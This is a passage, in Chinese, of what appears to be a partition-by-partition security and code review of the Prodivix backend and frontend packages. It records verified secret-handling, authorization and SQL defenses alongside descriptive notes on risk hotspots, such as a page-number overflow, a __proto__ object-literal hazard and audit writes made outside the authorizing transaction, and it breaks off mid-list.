**结构观察**: 密钥处理的核心确实很扎实,我在其中没有发现密码学或授权方面的破绽。以下几点经核实为正确:会话令牌只以 SHA-256 摘要形式持久化,且存储的摘要本身无法作为 bearer token 重放;登录在「用户不存在」分支上使用固定开销的假 bcrypt 比较,并按 IP 和账户摘要分别限速;信封加密对每个密钥使用独立的 AES-256-GCM 数据密钥,由 KMS 以域分离的 AAD(`prodivix.environment-secret.material.v1` / `.data-key.v1`)包裹,并绑定到 workspace/environment/revision/binding;AWS KMS 包裹密钥的元数据用 `subtle.ConstantTimeCompare` 比较,响应中的 `KeyId`/`EncryptionAlgorithm`/`CiphertextForRecipient` 也都做了交叉校验;密钥轮换只重新包裹数据密钥(绝不重新加密材料),在全行 `IS NOT DISTINCT FROM` 围栏之下进行,并在退役密钥缺失时 fail closed;`Store.Available()` 在 KMS 密钥环配置错误时 fail closed;三个模块中的每个 handler 都执行所有权检查(SQL 中的 `owner_id = $principal`,外加 `environment.authenticatedPrincipal` 中的 `session.UserID == user.ID`)。该分区中的每一条 SQL 语句都使用参数化,包括动态拼装的 `ListPublic` 和 `UserStore.Update` 子句,而 `ILIKE` 关键字路径正确地以 `ESCAPE '\\'` 转义了 `\\ % _`。

值得留意的风险热点。(1) `environment/store.go` 长 500 行,承载了整个密钥生命周期 —— 授权签发、使用、吊销、snapshot 写入 —— 而审计边界是以尽力而为的旁路写入实现的,并未纳入同一事务;发现 1 只是其中一个实例,但这种通用模式(审计写在授权该操作的事务之外)值得做一次设计复盘。(2) `UseSecret` 会重新校验 grant,但不校验该 grant 所绑定的 session,因此已登出的 session 会留下一个最长等于 grant TTL(由 `maximumGrantDuration` 限制为 5 分钟)的时间窗,期间 grant 仍然可用 —— 考虑到 TTL 尚可接受,但这与确实会 join `sessions` 的 `IssueGrant` 构成一种刻意的不对称。(3) `execution_environment_revisions` 与 `execution_environment_secret_materials` 从不清理,因此任何锁定旧 revision 的所有者都能继续解析每一个历史密钥,而轮换作业的工作集也会单调增长。(4) `ParsePositiveInt` 对 `page` 没有上界,因此 `(Page-1)*PageSize` 可能溢出为负的 OFFSET,把 `/api/community/projects?page=<huge>` 变成 500 —— 表面上只是观感问题,但这是对不受信任输入的未校验算术。(5) `secretCipher.encrypt`(crypto.go:60)如今已没有生产调用方 —— 只有遗留的解密路径仍在使用 —— 因此它实际上只是测试用的接口,却看起来像一条受支持的写入路径。

测试质量良好且符合策略:没有 DOM/snapshot 耦合(Go),environment/auth 的测试用显式的密钥金丝雀断言真实语义(`encryptedCanaryArgument` 检查持久化的密文不包含明文,handler 测试则断言响应体既不含金丝雀也不含 `secretsById`)。我没有发现无断言的测试。唯一值得点名的缺口是:没有测试覆盖消费方返回错误时的 `UseSecret`,而那正是发现 1 中的审计漏洞。

### 5.9 `be-remoteexec-integrations` — backend remoteexecution + integrations (Go)

**覆盖范围**: 完整阅读(生产环境 Go 代码,仅静态分析,未执行任何内容):remoteexecution/data_gateway.go, data_gateway_contract.go, data_gateway_protocol.go, data_gateway_stream.go, data_gateway_transport.go, data_gateway_replay_store.go, handler.go, routes.go, store.go, terminal.go, server_function_gateway.go, server_function_secret_adapter.go, server_function_mutation_store.go, server_function_secret_resolution_store.go, isolated_secret_broker.go, workspace_execution_authority.go, workspace_execution_role_handler.go;integrations/github/handlers.go, store.go, webhook.go, routes.go, models.go。略读了测试文件(data_gateway_test.go, handler_test.go, store_test.go, server_function_gateway_test.go, terminal_test.go, isolated_secret_broker_test.go, workspace_execution_role*_test.go, 各个 *.integration_test.go 文件, github/store_security_test.go, github/webhook_test.go)以确定预期语义 —— 特别是 data_gateway_test.go:107 处的 fake replay store 与 data_gateway_replay_store.integration_test.go:188 处的 core.http-only fixture,这正是当前测试套件无法发现发现 3 的原因。此外还阅读了 apps/backend/internal/platform/database/database.go:560(github_installation_setup_states schema)以及 apps/backend/internal/modules/auth(session 的 ExpiresAt 为 UnixMilli,与 handler.go 的用法一致),以确认跨模块假设。未覆盖:remote runner / preview-host 服务本身(属于其他分区),以及 backendenvironment 的 Secret store 实现,我将其视为可信接口。

**结构观察**: 该分区的防御性异常之高,绝大多数硬边界都成立:Data Gateway 的 transport 先解析 DNS,再固定(pin)已验证的 IP 并禁用重定向(data_gateway_transport.go:49-78);Secret 材料只存在于 UseSecret 回调内部,并对 header map 使用 defer delete(...),外加一次上游回显检查;isolated broker 用 X25519+HKDF+AES-GCM 封装材料,并把 AAD 绑定到完整的请求身份;terminal 代理对五个 action 做白名单,因此尾部路径段无法被注入;mutation replay store 在独立语句中获取按 execution 划分的 advisory lock,并具备正确的 fail-closed fencing。

值得跟踪的非缺陷风险:
1)DataGateway.checkpointKey 是进程内随机生成的(data_gateway.go:32-34),而 stream 的 resume token 用它做 HMAC。在多副本或重启后的部署中,被路由到另一个实例的 resume 会以 409 DATA_STREAM_CONFLICT fail closed —— 安全,但 resume 实际上只能在单实例范围内使用。activeStreams 预算(32)同样是按进程而非按集群计算的。
2)HandleArtifactContent 与 HandlePreviewSession 会把整个 artifact 缓冲在内存中(maximumGatewayBodyBytes = 64 MiB,handler.go:27),而 preview 路径还会为上传保留第二份副本。该模块中没有按 principal 的并发上限,因此少数几个并行的 preview session 就可能占用数百 MiB。
3)DataGatewayStreamSession.Next 为每一帧新建一个 time.After(30s) 且从不停止它;虽然无害,但每个 stream 最多会保留 256 个存活的 timer。
4)IsolatedSecretBroker 的预留仅以 execution_id 为键(server_function_secret_resolution_store.go:87),因此同一次 execution 内的第二个 artifact/export/调用只能靠递增 worker_attempt 才能解析 secret;如果 isolated worker 将来需要在一次 execution 中使用两个 function ref,这里会 fail closed 拒绝。
5)HandleEnvelope 只在通用的 RecordExecution 失败时才对未记录的 execution 做补偿;ErrExecutionAuthorityConflict 分支(handler.go:610-612)直接返回 409,却没有取消已经创建的远程 execution,从而在 runner 中留下一个孤儿运行任务。
6)github.UpsertInstallationRepositories(store.go:109)是该文件中唯一没有 defer tx.Rollback() 的 transaction;目前每条路径要么显式回滚要么提交,但只要多出一个提前 return 就会泄漏连接。

### 5.10 `be-platform` — backend platform / app / config / cmd (Go)

**覆盖范围**: 完整阅读:apps/backend/server.go, apps/backend/server_test.go, apps/backend/cmd/server/main.go, apps/backend/internal/app/{runtime.go, routes.go, routes_test.go, doc.go, environment_secret_key_rotation_maintenance.go(+test), workspace_asset_blob_maintenance.go(+test)}, apps/backend/internal/config/{config.go, config_test.go}, apps/backend/internal/platform/database/{database.go, database_test.go, pir_wire_migration.go}, apps/backend/internal/platform/http/middleware/{cors.go, cors_test.go}, apps/backend/internal/platform/http/response/error.go, apps/backend/internal/platform/identity/random.go, apps/backend/internal/platform/pircontract/{contract.go, migration.go, current_version.generated.go}, apps/backend/internal/platform/nodegraphcontract/contract.go, apps/backend/Dockerfile, docker-compose.yml, .air.toml。不存在 apps/backend/migrations 目录 —— migration 被内嵌在 internal/platform/database/database.go 中。

作为佐证阅读的分区外代码(用于验证分区级缺陷的可达性,其本身未被审查):internal/modules/auth/{middleware.go, token.go, handlers.go 的 avatar 路径}、internal/modules/environment/{store.go 的 NewStoreWithKeyRing/Available, kms.go 的 staticKeyRingKMS, aws_kms.go 的 NewStoreWithAWSKMS, key_rotation.go}、internal/modules/workspace/{routes.go, asset_blob_retention.go}、internal/modules/remoteexecution/{routes.go, handler.go 的 auth/timeout 接线},以及来自 module cache 的 gin v1.11.0 的 mode.go + recovery.go。

未覆盖:workspace/、project/、remoteexecution/、github/ 和 environment/ 的 handler 与 store 的模块内部业务逻辑(由其他分区负责);platform/_contract/_.generated.json 下的生成式 JSON schema 文件。

**结构观察**: 以下内容状况良好,值得记录以免被重复标记:

- CORS(internal/platform/http/middleware/cors.go)采用精确匹配,绝不回显未列入白名单的 origin,绝不设置 Access-Control-Allow-Credentials,并以 403 拒绝而非放行。认证基于 bearer token(Authorization / X-Auth-Token)而非 cookie,因此缺少 CSRF token 层在设计上是正确的。
- 中间件顺序正确:`router.Use(CORS(...))`(server.go:67)先于所有路由注册(server.go:68),而 gin 在注册时构建 handler 链。workspace/、remoteexecution/、environment/ 的每条路由都把 `handlers.RequireAuth` 作为第一个 handler,唯一例外是 `POST /api/internal/remote-execution-secrets`,它在 broker token 为空时 fail closed(handler.go:244)—— 已核实,不构成发现项。
- 已设置 `router.SetTrustedProxies(nil)`,因此 ClientIP 无法通过 X-Forwarded-For 伪造。
- config 层的 Secret 处理很谨慎:base64 密钥材料在校验后被清零,错误字符串绝不回显密钥字节,KMS provider 矩阵在混合 / 不完整 / alias / region 漂移的配置下 fail closed。轮换维护逻辑的 logger 有意丢弃 provider 错误(environment_secret_key_rotation_maintenance.go:101),并有回归测试断言不会泄漏 canary。
- pir_wire_migration.go 在每条退出路径上都处理了 `rows.Close()`,并使用 CAS 谓词(`content_rev = $4 AND content_json = $5::jsonb`)配合 RowsAffected==1 的断言,因此并发写入不会被静默覆盖。
- `filesOnlyFS` 正确拒绝目录列举,avatar 流水线在服务端嗅探 content type 并自行生成文件名,因此 `/uploads` 不构成存储型 XSS 或路径穿越的攻击面。

尚无具体缺陷的风险区域 / 热点:

- database.go 是一个 613 行的文件,整个 schema 历史都以内联 Go 切片的形式存在。Migration 9 的 `ALTER TABLE remote_execution_grants RENAME COLUMN owner_id TO principal_id` 是其中唯一非幂等的 DDL 语句;它今天之所以安全,只是因为 registry 对其做了门控,但一旦 registry 丢失,启动将无法恢复。
- `Config.Environment` 被加载并校验,但其唯一的消费方只有 GitHub handler(runtime.go:63)和生产环境的数据库口令检查。它本是切换 gin release mode 的自然开关(发现 2),目前使用不足。
- apps/backend/Dockerfile 先设置 `USER app`,再设置 `WORKDIR /app`,而 avatar 上传写入的是相对路径 `data/uploads/avatars/...`,`/app/data` 既没有以 app 所有权预先创建,也没有声明为 VOLUME。取决于 BuildKit 版本的 WORKDIR 所有权语义,avatar 上传在容器镜像中可能因 EACCES 失败;而在所有情况下,上传文件都位于临时可写层,重新部署后会丢失。我无法通过静态分析确定所有权问题,因此没有将其作为发现项提交。
- 任何地方都没有设置安全响应头(X-Content-Type-Options、Referrer-Policy、HSTS)。对当前的 JSON API 加经过嗅探的图片静态路由而言,这属于低风险,但目前也没有为它们预留中间件位置。

### 5.11 `pkg-workspace` — packages/workspace

**覆盖范围**: 范围:`packages/workspace`(107 个受版本跟踪的文件,约 33.6k 行)。完整阅读:workspaceCommand.ts (1843)、validateWorkspaceVfs.ts、workspaceDocumentValidation.ts、workspaceContractRegistry.ts、types.ts、workspaceCodec.ts、workspaceHistory.ts、workspaceHistoryReplay.ts、workspaceOperation.ts、workspaceVfsIntent.ts、workspaceDocumentFactory.ts、workspaceRouteIntent.ts、workspaceRouteIntentCommand.ts、workspaceProjection.ts、workspaceSelectors.ts、workspacePirDocument.ts、workspacePirContent.ts、workspaceCodeDocument.ts、workspaceResourceDocument.ts、workspaceAnimationDocument.ts、workspaceCodeArtifactRefactor.ts、workspaceCodeLanguageEditTransaction.ts、workspaceDesignTokenSystem.ts、workspaceDesignTokenResolverDocument.ts、workspaceServerRuntimeAuthoring.ts、workspaceServerRuntimeAuthConfiguration.ts、workspaceServerRuntimeReadSecretAuthoring.ts、workspaceServerRuntimeSourceMutationAuthoring.ts、resolveCanonicalWorkspaceDocumentId.ts、index.ts、component/{workspacePirDocument, workspaceComponentGraph, workspaceComponentAuthoringTransaction, workspacePirGraphAuthoringTransaction, workspaceComponentExtractionTransaction, workspaceComponentExtractionReferences(+Registry), workspaceComponentImpactAnalysis, workspaceComponentImpactPlanner, workspacePirProjection}.ts、data/workspacePirDataOperationBindingTransaction.ts、authoring/{createWorkspaceSemanticIndexFromSnapshot, createWorkspaceCodeSlotRegistryFromSnapshot, workspaceCodeArtifactProvider, workspaceCodeArtifactLifecycle, workspaceExternalAdapter, workspaceSemanticRevision}.ts。阅读了 **tests**/workspaceCommand.test.ts 以确认预期语义。通过 git grep 交叉核对了 packages/workspace-sync(workspaceOperationCommitWriteSet.ts、workspaceLocalReplica.ts)、packages/router/src/routeCodec.ts 以及 apps/web 消费方的调用路径。未逐行阅读:property / 单元测试文件(仅略读以了解意图)、workspaceNodeGraphDocument.ts、workspaceDataSourceDocument.ts、workspaceDesignTokenDocument.ts、component/workspaceComponentDefinitionTransaction.ts、component/workspaceComponentExtraction{PirBindingReferences,PirReferenceProvider,IncomingReferenceProvider,ReferenceBuiltIn*,ReferenceInput,Reference.types}.ts,以及 authoring/ 下的三个 semantic-contribution provider 文件。

**结构观察**: 总体来看该包状态良好:Command/Transaction 内核确实可逆(每次 apply 都会重跑 reverseOps,并通过顺序无关的深度比较要求与前置状态结构相等);JSON-Pointer 实现严格遵循 RFC6901,遍历使用 `Object.hasOwn`,写入使用 `Object.defineProperty`,因此 `__proto__`/`toString` 这类指针段会被当作普通自有键处理,而不会造成原型污染(有专门测试覆盖)。Transaction 在隔离的 snapshot 上执行,只有完全通过校验的结果才会跨越边界,因此多文档 / route+VFS 编辑是原子的。撤销/重做正确地拒绝跨越 workspace 屏障(`findHistoryEntry`),合并则受 mergeKey + scope + recordedSequence + 时间窗口的约束。

值得记录的结构性观察(非缺陷):

- 校验深度不对称:`applyWorkspaceCommandInternal` 对以文档为目标的 Command 会提前返回,从不执行 `validateWorkspaceTransition`,因此单个 Command 的 apply(包括对 `kind:'command'` operation 的 History 撤销/重做)会跳过 `validateWorkspaceComponentGraph` 与 `validateWorkspaceAnimationTargets`。测试 `applies code document commands without PIR graph validation` 表明这是有意为之,且 authoring planner 用 `collectIntroducedGraphIssues` 做了补偿,但这意味着同一个 planner 返回的 `plan.command` 与 `plan.transaction` 并不具备等价的安全性。
- `workspaceHistoryReplay.restoreSelection` 在 Command 的 patch op 之外把 `activeDocumentId`/`activeRouteNodeId` 写入结果 snapshot,因此本地应用的 snapshot 可能与被记录的 operation 在服务端产生的结果不同。虽然只涉及选中状态,但这在构造上造成了本地与持久化之间的小幅偏离。
- 按体量与耦合度衡量的热点:`workspaceCommand.ts`(1843 行,patch 引擎 + envelope 校验 + 约 10 个按类型划分的内容门禁 + 全部 intent 请求工厂集中在一个文件中)与 `data/workspacePirDataOperationBindingTransaction.ts`(963 行)。两者都应把 patch 引擎 / 按类型的校验注册表从 Command 模块中拆分出去。
- `mergeWorkspaceOperations` 会拼接每一个被合并的 Command,而 `createWorkspaceCodeSourceUpdateCommand` 在每个 op 中都携带完整的文档源码,因此较长的合并链会保留 N 份完整源码副本。目前由于代码保存是显式触发而非逐次击键,该问题是有界的;但一旦自动保存 / 输入路径也采用相同的 mergeKey,它就会变成真正的内存问题。
- 该分区中不存在任何 secret 材料:server-runtime 的 authoring planner 只输出仅含引用的 `bindingId` 声明和回调形态的 `useSecret` 脚手架,绝不包含字面 secret 值。

### 5.12 `pkg-workspace-sync-router` — packages/workspace-sync + packages/router

**覆盖范围**: 完整阅读(生产源码):packages/router/src/{routeCore.ts (1233 行), routeCodec.ts, routeSemanticContributionProvider.ts, routeCodeSlotProvider.ts, routeNavigation.ts, routeTypes.ts, index.ts};packages/workspace-sync/src/{workspaceOperationCommitWire.ts (992), workspaceThreeWay.ts (810), workspaceResolutionOperation.ts, workspaceOutbox.ts, workspaceSemanticDiff.ts, workspaceRevisionConflict.ts, workspaceOperationCommitWriteSet.ts, workspaceOperationCommitResponseValidation.ts, workspaceLocalReplica.ts, workspaceOperationCommit.ts, workspaceTextDiff.ts, workspaceConflictSession.ts, jsonValue.ts, workspaceOperationCommitProjection.ts, workspaceOperationCommitResponse.ts, workspaceSettingsOutbox.ts, workspaceAuthoringDelta.ts, workspaceRevisions.ts, index.ts}。阅读的测试:routeCore.test.ts、routeCore.property.test.ts、workspaceOutbox.property.test.ts、workspaceLocalReplica.property.test.ts、routeRuntimeCodeSlotProvider.test.ts(apps/web)。通过阅读 packages/workspace/src/workspaceCommand.ts(applyWorkspaceCommand / applyWorkspaceTransaction / resolveWorkspaceCommandDomain),并 grep apps/web(workspaceRemoteSnapshotAdoption、workspaceRevisionRecovery、editorStore.workspaceSlice、useActiveRoutePreview)、packages/workspace(createWorkspaceCodeSlotRegistryFromSnapshot、createWorkspaceSemanticIndexFromSnapshot)、packages/pir-react-renderer 与 packages/animation 中的调用点,交叉核对了分区外的可达性。未逐行阅读(仅略读):workspace-sync 的六个 **tests**/*.test.ts 文件、routeSemanticContributionProvider.property.test.ts、workspaceSettingsOutbox.property.test.ts,以及 tsconfig/vitest/package 的 manifest。两个包中都没有测试违反 DOM/snapshot/querySelector 测试策略,略读的测试中也没有一个是不做任何断言的。

**结构观察**: 总体来看,以两个包的体量而言,它们的工程纪律异常出色:封闭的 wire record 会显式拒绝未知字段,decode 路径 fail closed,序列化前有确定性排序(`freezeFacts`、`toDocumentExpectations`、`compareUnicodeCodePoints`),并且完全不存在游离的 promise、timer、监听器或 React 层面 —— 因此异步 / 资源 / 泄漏这几类问题在这里确实为空。

风险集中点,按顺序:

1. `workspaceThreeWay.ts` 与 `jsonValue.ts` 这一对语义相等性实现是杠杆最高的单一区域。同一份 authoring 状态现在存在两个不同的相等性归属者:顺序无关的 `semanticJsonValuesEqual`(供 diff 与 merge 使用)与顺序敏感的 `jsonValuesEqual`(供 `analyzeWorkspaceAuthoringDelta` 使用,也就是提交计划器与 ACK 校验器)。凡是二者判定分歧之处,都可能在「merge 认为发生了什么变更」与「commit 认为发生了什么变更」之间造成静默偏离;发现 1 是我能够确凿定位的具体实例,但这种双归属者的局面本身就值得专门形成一份决策记录。
2. `routeCore.ts` 有 1233 行,把树编辑、匹配、组合、导航与校验混在同一个模块中。三态字段 `index?: boolean` 在该文件中用了三种不同写法处理(313/750/840/1119 行使用 `node.index` 的真值判断,791 行使用严格不等比较),这正是发现 2 的成因。在 codec 边界把 `index` 归一化为必填布尔值可以消除整类问题。
3. 围绕 `flattenRouteManifest` 中硬编码的 `id !== 'root'` 排除逻辑的归属边界:四个调用点中有三个显式做了补偿,一个没有(发现 3)。字面量 `'root'` 也在 routeCore 与 routeCodec 之间重复出现,而没有作为共享常量提取。

值得记录的正面结论:Outbox 的 lease/claim/retry 状态机以及 `createMemoryWorkspaceOutboxStore` 在我能追踪到的范围内都是正确的 —— 仅对队头认领、以 operation id 作为幂等键、由 lease 持有者守卫的状态迁移、有界的抖动退避,以及 replace 时的因果顺序继承都站得住脚,property 测试也做了有意义的覆盖。`workspaceOperationCommitWire.ts` 的封闭 record 解码与 `workspaceRevisionConflict.ts` 的冲突信封解码都严格 fail closed,我没有找到任何缺口。`workspaceResolutionOperation.ts` 以 `operationMatchesResolution` 收尾,这是一个重新应用并做差异比对的检查:只要生成的恢复 Command 无法复现已解决的 snapshot,它就 fail closed —— 这是一个很好的模式,消除了该文件中多类部分应用缺陷。该分区中完全不存在 secret 处理、注入、路径穿越、SSRF、`eval`/`new Function` 或 `dangerouslySetInnerHTML` 相关的攻击面。

### 5.13 `pkg-compiler-targets` — prodivix-compiler react + vue targets

**覆盖范围**: 完整阅读:react/standaloneDataLiveRuntime.ts (1960)、react/standaloneDataRuntime.ts (966)、react/controlledRoundTrip.ts (1430)、react/controlledReactJsx.ts (769)、react/controlledCss.ts (644)、react/workspaceProject.ts (1380)、react/nodeCompiler.ts (676)、react/documentCompiler.ts (612)、react/standaloneServerRuntime.ts (558)、react/workspaceServerRuntimeTarget.ts (539)、react/workspaceDataRuntimeTarget.ts (289)、react/standaloneExecutionConsoleRuntime.ts (310)、react/collectionRuntime.ts (388)、react/workspaceCompiler.ts (192)、react/importRegistry.ts、react/bindingCompiler.ts、react/moduleNaming.ts、react/projectionPathRuntime.ts、react/dataOperationRuntime.ts;vue/workspaceProject.ts (794)、vue/workspaceApp.ts (787)、vue/workspacePirRuntime.ts (635)、vue/index.ts。为验证可达性,交叉核对了分区外的支撑契约:packages/data/src/data.types.ts + dataDocument.ts(operation 种类、授权校验)、packages/server-runtime/src/serverRuntime.types.ts(ServerFunctionDefinition/environment 结构)、packages/pir/src/codec/pirCodec.ts(node-id 与 open-url href 校验)、packages/prodivix-compiler/src/export/routeTopology.ts(runtimeRefs 排序)、apps/web/src/editor/features/code/useCodeAuthoringSession.ts + workspaceSync/workspaceAuthoringOperationDispatcher.ts(controlled round-trip 调用路径)。略读了范围内全部 13 个测试文件(grep expect 数量以及 querySelector/closest/parentElement/snapshot 的使用)—— 未发现测试策略违规,也没有不做断言的测试;controlledCss.property.test.ts 与 controlledReactJsx.property.test.ts 做了细读,以确定这些往返 property 覆盖了什么、没覆盖什么。未覆盖(分区外):src/export/**、src/executableProject/**、src/core/**、src/animation、src/nodegraph,以及 controlledRoundTrip.ts 所委托的 `@prodivix/authoring` 受控源区域扫描器 / 渲染器。

**结构观察**: 总体来看该分区的工程纪律异常出色:几乎每一个产出的结构都做了显式排序;对插值的标识符 / 字符串一律使用 `JSON.stringify`,因此传统的模板注入无法进入生成源码;secret 材料在 `kind !== 'literal'` 边界处从 Data 文档中被剥离;受控的 JSX/CSS 适配器确实保守(对任何非字面量绑定 fail closed、保留受保护绑定、每次写入前做漂移检测)。Workspace 不变量的情况同样成立:`controlledRoundTrip.ts` 中的每一次 authoring 写入都被规划为可逆的 Command/Transaction,通过 `applyWorkspaceCommand`/`applyWorkspaceTransaction` 做预检校验,并由 `validateBaseRevision` 做 revision 门控;没有任何地方直接写入 VFS。

风险集中点,按降序排列:

1. `standaloneDataLiveRuntime.ts`(1960 行)是最大的单一热点 —— 它是一段以字符串模板拼接的运行时,自身内容不受类型检查,混合了 SSRF 策略、HTTP/GraphQL/AsyncAPI 适配器、分页、缓存、重试、流收集以及 postMessage 桥接协议。唯一的严重级别发现和 `privateHostname` 缺陷都出自这里,而它的正确性仅被 `standaloneDataRuntime.test.ts` 部分覆盖。
2. 生成代码的标识符卫生。`toIdentifier` 在 `nodeCompiler.ts` 与 `importRegistry.ts` 中逐字重复出现,但只有 import registry 通过唯一性注册表来分配名称,node compiler 则没有。将来任何由 Workspace id 派生的生成局部名都存在同样的隐患。
3. 产出源码中的 `__proto__` 隐患(因可达性低而未作为发现项上报,但值得记录):`bindingCompiler.ts:19`/`nodeCompiler.ts:51` 直接把 JSON 作为 JavaScript _对象字面量_ 输出。`JSON.parse` 会把 `"__proto__"` 当作自有数据属性,而带有 `"__proto__"` 字符串键的对象字面量则会执行原型赋值。因此,包含 `__proto__` 的 PIR 字面量(或 `standaloneDataRuntime.ts:160-161` 中的数据源文档 id)在往返进入生成源码时会出错。提供一个共享的 `toObjectLiteral` 辅助函数,对该键输出 `{ ["__proto__"]: ... }`,即可堵住这个问题。
4. 规范序列化器的分化。该分区中至少存在四个各自独立的 `canonicalJson`/`compareText` 实现,其中两个使用 `localeCompare`(`standaloneServerRuntime.ts:217`、`vue/workspacePirRuntime.ts:259`),其余使用代码单元顺序。统一到一个对外导出的比较器可以消除整类确定性漂移问题。
5. 两个高度相似的组合根(`react/workspaceProject.ts` 与 `vue/workspaceProject.ts` + `vue/workspaceApp.ts`)已经出现分化:Vue 的运行时表会对每条路由的 kind 条目排序,React 的则不会;Vue 应用在卸载时会释放模块级单例的 data runtime,React 从不释放;Vue 的 `dispatchWorkspaceRouteAction` 缺少 React 的提交 key 集合校验及其自有的 AbortController。这些目前是良性的,但最有可能成为未来非对称缺陷的源头。

### 5.14 `pkg-compiler-core` — prodivix-compiler core / executableProject / export

**覆盖范围**: 完整阅读(生产源码,分区 = packages/prodivix-compiler/src,排除 src/react 与 src/vue,39 个受版本跟踪的文件 + 1 个未跟踪文件):export/planner.ts、export/types.ts、export/programBuilder.ts、export/artifactPlanner.ts、export/assetPlanner.ts、export/codeArtifactPlanner.ts、export/dependencyPlanner.ts、export/deploymentPresets.ts、export/filePlanner.ts、export/importPlanner.ts、export/index.ts、export/naming.ts、export/originPolicy.ts、export/packageOriginResolver.ts、export/pathPlanner.ts、export/pirEntrySurface.ts(未跟踪,新增)、export/routeTopology.ts、export/sourceResolver.ts、export/stylePlanner.ts、export/workspaceGitAssetProjection.ts、export/presets/reactVite.ts、export/presets/vueVite.ts、executableProject/isolatedServerFunctionImportGraph.ts、executableProject/isolatedServerFunctionProject.ts、executableProject/runtimeFilesystemProposal.ts、executableProject/runtimeFilesystemProposalAnalysis.ts、executableProject/workspaceExecutableProject.ts、executableProject/workspaceVueExecutableProject.ts、animation/compileAnimation.ts、nodegraph/compileNodeGraph.ts、core/adapter.ts、core/codegenPolicy.ts、core/diagnostics.ts、core/packageResolver.ts、index.ts。完整阅读了 export/**tests**/planner.test.ts;对另外三个测试文件 grep 了禁用模式(querySelector/closest/parentElement/snapshots)—— 均未发现,也未观察到不做断言的测试。仅为确认可达性而交叉核对了分区外的调用方:packages/runtime-core/src/executableProjectNormalization.ts 与 executionFilesystemDiff*.ts(路径 / 摘要校验)、packages/assets/src/binaryAsset.ts(摘要格式)、packages/server-runtime/src/isolatedServerRuntime.ts(isolated 策略门禁、secret 材料排序)、packages/plugin-contracts/src/generated/codegenPolicyContributionSchema.generated.ts(标识符模式)、apps/remote-runner-worker/src/workerAgent.ts + rootlessPodmanSandbox.ts(authority 签发、node_modules 排除)、packages/prodivix-compiler/src/react/workspaceProject.ts(contribution 排序、code-artifact 的 desiredPath)、apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts 与 features/export/ExportCode.tsx。未覆盖:src/react 与 src/vue(已明确排除在该分区之外),以及 @prodivix/workspace 的 command/intent 校验内部实现。

**结构观察**: 我重点探查且确认干净的区域,在没有新证据前不应重复审查:

- Isolated Server Function import 图(isolatedServerFunctionImportGraph.ts)。通过 `active`/`modules` 处理环的方式是可靠的(在 `rewriteStaticImports` 运行前,每个 import 目标都保证已存在于 `generatedPathByDocumentId` 中);模块数 / 深度 / 字节上限全部 fail closed;`resolveRelativePath` + `canonicalDocumentPath` 会拒绝 `..` 逃逸、反斜杠、NUL 以及 query/hash 后缀;歧义解析(`x.ts` 与 `x/index.ts`)fail closed;specifier 重写按偏移量从后往前应用,因此靠前的偏移量始终有效;`generatedModuleSpecifier` 为 root/modules 布局生成正确的 `./` 与 `../` 形式;`transpileModule` 失败时会阻断而非继续产出。
- 生成 runner 中的 secret 处理(isolatedServerFunctionProject.ts:89-354)。只有 `SecretRef` 值(绝不含材料)会进入 profile/plan/snapshot;`isIsolatedServerFunctionProjectSourceMutationDefinition` 要求 `environment === undefined`,因此即便文件写入发生在结果泄漏扫描之前,`replaceProjectSource` 写入路径也绝不可能携带 secret 材料;`readIsolatedServerFunctionSecretMaterial`(严格升序)与 runner 的 `JSON.stringify(sorted)` 比较之间的 secret 字段排序约定是一致的。
- 运行时文件系统采纳(runtimeFilesystemProposal*.ts)。路径穿越不可能发生,因为 `normalizeExecutableProjectPath` 已在 diff 边界拒绝 `/`、`\`、盘符前缀、`.` 与 `..`;资产摘要在两侧都使用相同的 `sha256-<hex>` 格式,因此不会误触发 `baseline-drift`;重复目标、路径冲突、过期 revision、生命周期与受控源检查全部 fail closed;`planCommands` 会针对不断演进的 snapshot 重新规划,并在第一次被拒绝时中止整个 transaction。
- Codegen policy 适配器(core/codegenPolicy.ts)。`packageName`、`imported`、`elementPath[0]` 与图标导出符号受生成的 contribution JSON schema 模式以及 `isIconPolicyExportIdentifier` 约束,因此不会有 import 或 JSX 注入进入生成源码。

值得关注的热点:

- 导出路径的预留使用单一扁平的 `usedPaths` 命名空间,由模块、样式表、资产、脚手架文件与部署文件共享,且模块总是优先。发现 1 只是其中一个实例;更普遍的脆弱之处在于没有任何地方把脚手架拥有的路径声明为已预留,而 `normalizeExportCodeArtifactPath` 又有意抹平 `code/` 与 `src/` 前缀,这会使冲突最大化。
- 即使 `metadata.exportBlocked` 为 true,`ProductionExportPlanner.plan()` 仍会返回完整文件集。可执行项目生成器对它做了正确检查,但 `apps/web/src/editor/features/export/ExportCode.tsx`(属于其他分区)在打包并下载 `bundle.files` 时并未查看 `exportBlocked` / `blockingDiagnostics` —— 值得在 apps/web 分区提一个发现项。
- `planner.ts:794` 把所有 `source === 'export'` 的诊断都排除在 `metadata.diagnosticSummary` 之外,包括 `EXP-4001` 这类真实的导出错误;因此对于被阻断的导出,summary 可能报告零错误。目前仓库内没有消费方读取 `diagnosticSummary`,所以我没有提出这一项。
- `.prodivix/export-manifest.json` 只列出 `filesWithoutPolicyMetadata`,因此 `origins.json`、`licenses.json` 以及 manifest 自身虽然被产出,却不在该 manifest 自己的 `files` 数组中。目前没有消费方会用产出的文件树去校验 manifest,所以这属于潜在问题而非现实缺陷。
- `hashExportFileContents` 为 provenance 产物中记录的 `contentHash` 使用 FNV-1a 32 位算法,而仓库其余部分对内容标识使用 `sha256-<hex>`。今天它只用于审计,但它无法承担 origins/licenses manifest 存在的防篡改目的,并且在约 77k 个文件的规模上就会发生碰撞。
- `deploymentPresets.ts:97` 把 `outputDirectory` 插入 TOML 双引号字符串时未做转义。仓库内没有调用方使用 `netlify` 目标,因此目前不可达,但公开的 `createStaticDeploymentExportContribution` API 允许这样做。

### 5.15 `pkg-pir` — packages/pir + pir-react-renderer

**覆盖范围**: 完整阅读:packages/pir —— codec/pirCodec.ts、codec/pirMigrationRegistry.ts、codec/pirWireMigrationV13ToV14.ts、V14ToV15.ts、V15ToV16.ts、codec/pirWire.generated.ts(仅作为参考契约)、pir.types.ts、pirValidator.ts、pirBindingValidator.ts、pirDataOperationInput.ts、pirFactory.ts、wire.ts、projection/{pirCollectionProjection, pirComponentProjection, pirCollectionDataLifecycle, pirProjectionPath, readValueByPath}.ts、mutations/{pirMutationGraph, pirMutationValidation, pirGraphAuthoringMutations, pirNodeAuthoringMutations, pirElementAuthoringMutations, pirComponentMutations, pirGraphFragmentMutation, pirSlotRegionMutation}.ts、extraction/{pirSubtreeExtraction, pirExtractionBoundary, pirExtractionGraph, pirExtractionNodeRewrite, pirExtractionValueBoundary}.ts、authoring/{pirSemanticContributionProvider, 